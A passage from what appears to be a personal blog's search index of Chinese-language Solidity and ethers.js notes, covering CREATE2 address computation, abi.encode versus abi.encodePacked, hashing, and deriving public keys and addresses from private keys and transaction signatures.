= ethers.utils.keccak256(str2); //判断 是否满足条件 if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; 搭配使用的solidity代码 计算地址： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 4. 推荐使用 ethersjs","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"encode && encodePacked","slug":"Basic_Knowledge/solidity/abi.encode&&abi.encodePacked","date":"2023-05-24T08:10:10.000Z","updated":"2023-05-24T08:10:10.000Z","comments":true,"path":"2023/05/24/Basic_Knowledge/solidity/abi.encode&&abi.encodePacked/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/24/Basic_Knowledge/solidity/abi.encode&&abi.encodePacked/","excerpt":"","text":"abi编码的详解1.abi.encode abi.encode 将它的每个参数填充为32字节【32 * 8 &#x3D;256位】（1byte &#x3D; 8bit）的数据，并拼接在一起。 注：如果要和合约交互，使用的是abi.encode（实践操作） 1.1 abi.encode编码演示定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 123function testABIEncode1() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num1, _addr, name, bs1); &#125; 代码2： num2是uint256类型，占用32个字节 123function testABIEncode2() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num2, _addr, name, bs1);&#125; 看运行结果： 由运行结果 比较num1 和num2的编码值可知，不管参数的数据类型是什么，它都将参数填充为32位。所以这两个函数的编码结果相同。 1.2 abi.encode 与合约交互 —- 以create2为例create2 的使用请移步 &#x3D;&#x3D;&#x3D;》 【abi.encode】通过 abi.encode对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 123456// 非紧打包 -- 涉及了合约构造函数的参数 function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数代码： 123456789101112131415function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 验证结果（正确）： 【abi.encodePacked】通过 abi.encodePacked对要部署合约的字节码和代传参数（id &#x3D; 1, name &#x3D; “biyou”）进行“非紧”打包： 12345// 紧打包function encodePackedBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; result = abi.encodePacked(temp, abi.encodePacked(id,name));&#125; 运行结果的部分截图： 将获取的bytecode的值，放入create2Address函数中,传入盐salt（biyou），计算 Student合约的地址 create2Address函数同上 运行结果： 再将获取的地址通过remix上的At Address获取合约，并调用其中的函数检验结果： At Address: 运行结果（出错）： 2. abi.encodePacked2.1 编码演示 将给定参数根据其所需最低空间编码。类似于abi.encode，但是会把其中填充的很多0省略。比如，只用1字节来编码uint类型。当你想省空间，并且不与合约交互的时候，可以使用abi.encodePacked，例如算一些数据 的hash时。 最低空间编码（个人理解）: 因为在以太坊EVM中的ABI，默认给每个属性（字段）赋予一个 32字节（32 * 8 &#x3D; 256位）的长度（不足部分被0填充）, 实际占用长度取决于属性的类型。 整型： 1&gt;uint8 num = 1; // 这个占用8bit，即一个字节，前面将填充31 * 8 个零，又因为在以太坊中数据一般格式为16进制，16进制数的一位占四个 xxxx(x是0或1) 例： 0xff = 11111111 这样前面显示的0的个数为 31 * 8 &#x2F; 4 &#x3D; 62个（uint8 num &#x3D; 1，本身表示为：0x01） 所以使用abi.encodePacked打包，将会是保留uint8本身的长度（8位）即1字节即0x01， 如图： 1&gt;uint256 num2 = 1;//占用 256位，即 0x0000000000000000000000000000000000000000000000000000000000000001，因为num2声明为uint256明确指明了占用256位，所以EVM会给num2分配的最低空间为 256位 所以使用abi.encodePacked打包，将会是保留uint256本身的长度（256位）即32字节 如图： bytesn（n的范围是[1,32]）类型：和uint类型类似 bytes1 &#x3D;&#x3D;&gt; uint8 关于 bytes家族移步&#x3D;&#x3D;》 string类型： 将字符串转为bytes类型之后实际有多长就保留多长 字符串转bytes代码： 123function stingConvertBytes(string memory _str) external pure returns(bytes memory result)&#123; result = abi.encodePacked(_str);&#125; address类型： 因为address是160位的，所以只保留160位即可 定义的变量： 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; 代码1： num1是uint8类型，占用1个字节 num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked1() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num1, _addr, name, bs1);&#125; 结果： 代码2： &#96;&#96;num1是uint8类型，占用1个字节&#96; num2是uint256类型，占用32个字节 _addr是address类型，占用20个字节 name是string类型，占用字节数取决于实际情况长度 bs1是bytes1类型，占用1个字节 123function testABIEncodePacked2() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num2, _addr, name, bs1);&#125; 看运行结果： 3. 总结不需要和其他合约交互的时候大多选择 abi.encodePacked的打包方式，包括签名操作什么的 需要与其他合约进行交互的则选择abi.encode的打包方式—其他的合约交互正在学习","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"}]},{"title":"Create && Create 2","slug":"Basic_Knowledge/solidity/Create2","date":"2023-05-23T08:10:10.000Z","updated":"2023-05-23T08:10:10.000Z","comments":true,"path":"2023/05/23/Basic_Knowledge/solidity/Create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/23/Basic_Knowledge/solidity/Create2/","excerpt":"","text":"1. create1.1 简介 概念： 智能合约可以由其他合约和普通账户利用 create操作码创建。在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和nonce(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。 计算式： 新地址 = hash(创建者地址, nonce) 创建者地址不会变，但nonce可能会随时间而改变，因此create创建的合约地址不好预测。 2.create22.1 简介 create2的用法和create有点类型，同样是new一个合约，并传入新合约构造函数所需的参数，不同点在于要多传入一个salt（盐）参数： 1Contract X = new Contract&#123;salt: _salt, value: _value&#125;(params); 解读：Contract是要创建的合约名，X是合约对象（address），_salt是指定的盐；如果构造函数是payable，可以在创建时传入_value数量的ETH，params是新合约构造函数的参数。 2.2 计算create2地址注：如果需要进行合约交互，且待部署合约的构造器带参，则需要对待传参数进行abi.encode()打包，再使用 abi.encodePacked()对bytecode和abi.encode()的结果进行紧打包 如代码所示： 123456function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; ❗❗❗abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)) 外层的abi.encodePacked()将不会对abi.encode(1,&quot;biyou&quot;)的值进行紧打包了，举例如下： 代码1： 1234567// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行紧打包 result = abi.encodePacked(temp, abi.encode(id,name));&#125; 结果1： 代码2： 123456// 非紧打包 -- 涉及了合约构造函数的参数function encodeBycode1(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // 将字节码和参数进行非紧打包 result = abi.encode(temp, abi.encode(id,name));&#125; 结果2： 测试合约； 123456789101112131415161718192021// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// 一个用于测试的合约contract Student &#123; uint256 public id ; string public name; constructor(uint256 _id, string memory _name) &#123; id = _id; name = _name; &#125; function getId() external view returns(uint256) &#123; return id; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; 代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// create2合约contract create2 &#123; // 使用create2计算地址,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包后再进行hash keccak256(getBycode()) //获取要计算的合约的字节码 再进行hash )) ) ) ); &#125; // 使用create2计算地址,传入代部署合约的字节码,我只需要改变salt(string类型)的值就可以就算出不一样的地址 function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // 固定的一个字节的常数 0xff address(this), //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ) ) ); &#125; // 获取部署合约的字节码（内部合约） function getBycode() internal pure returns(bytes memory result) &#123; // type().creationCode 写死 bytes memory temp = type(Student).creationCode; // 这里的参数值我写死了（Student 构造器的参数） result = abi.encodePacked(temp, abi.encode(1,&quot;biyou&quot;)); &#125; // 通过create2部署合约，new的形式 function makeSudentByCreate2(string memory _salt, uint256 id, string memory name) external returns(Student student)&#123; student = new Student&#123;salt: keccak256(abi.encodePacked(_salt))&#125;(id, name); &#125;&#125; 一个灵活一点的代码： 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // 固定的一个字节的常数 0xff addToDeploy, //当前合约地址（create2合约地址） keccak256(abi.encodePacked(salt)), //对盐进行紧打包 keccak256(bycode) //要计算的合约的字节码 )) ))); &#125;&#125; 2.3 使用内联汇编123456789101112131415161718// /* 使用内联汇编自带的 create2() */function create2NewContractByInline(uint salt) public returns (address) &#123; bytes memory code = type(test).creationCode; // 如果待部署合约的构造器中有参数，则使用如下方式进行获取code // bytes memory code = abi.encodePacked(type().creationCode, abi.encode())； bytes32 _salt = keccak256(abi.encodePacked(salt)); address result; assembly &#123; result := create2( 0, // value 表示要向新合约发送的以太币数量 add(code, 32), // 表示跳过数组长度 mload(code), // 读取code的长度 _salt // 盐 ) &#125; return result;&#125; 2.4 暴破求解create2地址————计算出 将来的地址合约含有某个字段操作方法 &#x3D;&#x3D;&#x3D;&#x3D;》计算指定合约地址（含某个字段） 相关链接","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"Txhash_To_PubKey","slug":"Utils/Ethersjs/从交易获取哈希","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Utils/Ethersjs/从交易获取哈希/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Utils/Ethersjs/%E4%BB%8E%E4%BA%A4%E6%98%93%E8%8E%B7%E5%8F%96%E5%93%88%E5%B8%8C/","excerpt":"","text":"Tx Hash -&gt; Public Key 从一笔链上的交易哈希获取签名的公钥。 code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;; //rpcconst provider = new ethers.providers.JsonRpcProvider(connection);// Tx-Hashconst txHash = &quot;&quot;;// 获取交易信息const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //打印交易详情// txData 对象内的字段缺一不可const txData = &#123; // gasPrice: transaction.gasPrice, // 这个不需要，否则会报错 gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// 对txData交易对象序列化为其原始二进制格式const signingData = ethers.utils.serializeTransaction(txData);// 对序列化后的交易对象进行hashconst msgHash = ethers.utils.keccak256(signingData);// 获取交易详情中的 r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// 获取原生未压缩的公钥，即 0x04 开头的let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(`未压缩公钥:\\n $&#123;rawPublicKey&#125;`);// 把开头的 0x04 字段删掉 ===》 将 `0x04` 替换成 `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(`经压缩公钥:\\n $&#123;rawPublicKey&#125;`);// 公钥转钱包地址let address = ethers.utils.keccak256(rawPublicKey);console.log(`Address:\\n 0x$&#123;address.slice(address.length - 40)&#125;`); package.json: 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.7.2&quot; &#125;&#125; 签名原理","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Ethersjs","slug":"Utils/Ethersjs","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethersjs/"}],"tags":[{"name":"privake key","slug":"privake-key","permalink":"https://biyouqiuqiu.com/tags/privake-key/"}]},{"title":"Exchange_Of_prikey_pubkey","slug":"Utils/Solidity/私钥公钥地址的转化","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Utils/Solidity/私钥公钥地址的转化/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Utils/Solidity/%E7%A7%81%E9%92%A5%E5%85%AC%E9%92%A5%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BD%AC%E5%8C%96/","excerpt":"","text":"Private Key &lt;&#x3D;&gt; Public Key1. 了解 ECDSA算法ECDSA链接1 ECDSA链接2 2. secp256k1曲线比特币和以太坊使用secp256k1定义的椭圆曲线 secp256k1曲线 3. 安装库123npm install ethereumjs-wallet --save或npm install ethereumjs-util --save 这两条命令任意执行一条即可 4. 从私钥获取公钥4.1 方法一使用 ethereumjs-wallet和 ethereumjs-util 12345678910111213141516// import Wallet from &quot;ethereumjs-wallet&quot;;// import EthUtil from &quot;ethereumjs-util&quot;;// 因为当前的没指定模块，所以默认使用require语句导入包var Wallet = require(&#x27;ethereumjs-wallet&#x27;).default;var EthUtil = require(&#x27;ethereumjs-util&#x27;);// Get a wallet instance from a private key// privatekeyconst privateKey = &#x27;&#x27;;const privateKeyBuffer = EthUtil.toBuffer(privateKey);const wallet = Wallet.fromPrivateKey(privateKeyBuffer);// Get a public keyconst publicKey = wallet.getPublicKeyString(); console.log(`publicKey is =&gt; $&#123;publicKey&#125;`); 4.2 方法二使用的是ethersjs中的 Waller钱包的publicKey属性获取钱包的公钥，但是获取公钥会在起始位置多出04这个数据段，我暂时还不知道是什么东西 代码： 123456789101112131415161718192021222324import &#123; ethers &#125; from &quot;ethers&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥生成 singer对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey,provider);// 选择一个私钥let testPK = privateKey;// 计算公钥// const publicKey = curve.keyFromPrivate(testPK).publicKey(&quot;hex&quot;);let publicKey = wallet.publicKey;// 0x607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// 0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// let publicKey = &quot;0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f&quot;;let newKey = publicKey.substring(0,2) + publicKey.substring(4);console.log(`newKey = $&#123;newKey&#125;`); 运行结果： 运行结果： 5. 获取以太坊的钱包地址钱包地址的计算式： address = address(keccak256(publicKey)) solidity代码： 编译器为0.4版本的 12345678910pragma solidity ^0.4.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(keccak256(_publickey)); return _subPublickey; &#125;&#125; 编译器为0.8版本的 123456789101112// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes memory _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(uint160(uint256(keccak256(_publickey)))); return _subPublickey; &#125;&#125; remix上的结果： genache上查看钱包地址： 参考链接1 参考链接2","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"}],"tags":[{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"}]},{"title":"Hash 篇","slug":"Basic_Knowledge/solidity/hash篇","date":"2023-05-18T02:47:10.000Z","updated":"2023-05-18T02:47:10.000Z","comments":true,"path":"2023/05/18/Basic_Knowledge/solidity/hash篇/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Basic_Knowledge/solidity/hash%E7%AF%87/","excerpt":"","text":"前言 abi.encodePacked 函数将其参数按顺序拼接起来，不添加任何类型标识符或分隔符，并返回一个紧凑的字节数组，不包含长度信息。这种编码方式适用于构造哈希值和签名的情况，因为它生成的字节数组不受字节对齐的影响。 abi.encode 函数则将其参数编码为包含类型标识符和长度信息的字节数组，并返回一个动态字节数组，它包含了参数所需的所有信息。这种编码方式适用于在 Solidity 智能合约中调用其他合约函数的情况，因为它生成的字节数组可以被正确地解码为对应的参数类型。 ① ethersjs 中的 new ethers.utils.AbiCoder().encode([&#39;type&#39;], [value]) &lt;=&gt; 相当于 solidity中的 abi.encode() ② ethersjs 中的 ethers.utils.solidityKeccak256([&#39;type&#39;],[value]) &lt;=&gt; 相当于 Solidity中的keccak256(abi.encodePacked()) ③ ethersjs 中的 ethers.utils.keccak256() &lt;=&gt; 相当于 Solidity中的 keccak256() ④ethersjs 中的 ethers.utils.solidityPack([&#39;type&#39;], [value]) &lt;=&gt; 相当于 Solidity中的 abi.encodePacked() js代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\test\\\\day04\\\\getHash.abi&quot;).toString());// 通过ABI获取接口类const infe = new ethers.utils.Interface(ABI);// 获取函数选择器const getHashByAddress = infe.getSighash(&quot;getHashByAddress&quot;);console.log(`getHashByAddress is =&gt; $&#123;getHashByAddress&#125;`);/** * ethersjs 中的 ethers.utils.AbiCoder() &lt;=&gt; 相当于 solidity中的 abi.encode() * */ const abiCoder = new ethers.utils.AbiCoder();// 创建消息let msg1 = &quot;getHashByAddress&quot;;let msg1Hash = abiCoder.encode( [&#x27;string&#x27;], [msg1])let hash = ethers.utils.keccak256(msg1Hash);console.log(`hash is =&gt; $&#123;hash&#125;`);// 创建消息const msg = &quot;getHashByAddress&quot;;// 等效于Solidity中的keccak256(abi.encodePacked())const msgHash1 = ethers.utils.solidityKeccak256( [&#x27;string&#x27;], [msg])console.log(`msgHash: $&#123;msgHash1&#125;`)// msgHash：0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c// 先对 msg 进行打包 const msgHash2 = ethers.utils.solidityPack( [&#x27;string&#x27;], [msg])// 这两步等效于 `solidityPack()`const hash1 = ethers.utils.keccak256(msgHash2);console.log(`msgHash2: $&#123;msgHash2&#125;`);console.log(`hash1 is: $&#123;hash1&#125;`); solidity 合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract getHash &#123; constructor() &#123; &#125; function getHashByAddress(address _address) external pure returns(bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(_address)); return result; &#125; function getHashByString1(string memory _str) external pure returns(bytes32) &#123; // abi.encodePacked(_str); // bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); bytes32 result = keccak256(abi.encode(_str)); return result; &#125; function getHashByString2(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodeWithSignature(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString3(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString4(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = sha256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getEncode(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encode(_str); // return ; &#125; function getEncodePacked(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encodePacked(_str); // return ; &#125; &#125; abi文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140[ &#123; &quot;inputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncode&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncodePacked&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;address&quot;, &quot;name&quot;: &quot;_address&quot;, &quot;type&quot;: &quot;address&quot; &#125; ], &quot;name&quot;: &quot;getHashByAddress&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString1&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString2&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString3&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString4&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;] remix上的结果： vscode的结果：","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"}]},{"title":"ethersjs_using","slug":"Utils/Ethersjs/ethersjs_self","date":"2023-05-12T02:47:10.000Z","updated":"2023-05-12T02:47:10.000Z","comments":true,"path":"2023/05/12/Utils/Ethersjs/ethersjs_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/12/Utils/Ethersjs/ethersjs_self/","excerpt":"","text":"ethers.js_day011. ethers.js的安装 参考文档 在终端执行命令： 1npm install --save ethers 出现的问题: a. 按照 B站教程来的话，需要修改package.js中的配置，如： 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.6.9&quot; &#125;&#125; 在这里：加入了 &#39;&#39;type&quot;: &quot;module&quot;之后，require()这种引包的方式就不能使用了，网上搜了一下说是 ES6模块（没系统学过JavaScript，不是很懂，只是记录一下，避免继续犯错），得需要使用 import的方式导入 ethers包 1const &#123; ethers &#125; = require(&quot;ethers&quot;); 1import &#123; ethers &#125; from &quot;ethers&quot;; b. B站视频中在vscode上安装的ethers包的命令为： 1npm install ethers@5.6.9 这行代码会让代码无法运行，报错如下： 2. 编写 Hello Vitalik2.1 编译器： 在线编译器 —– playcode 本地编译器 —– VSCode 2.2 第一段代码 示例代码： 1234567import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider();const main = async () =&gt; &#123; 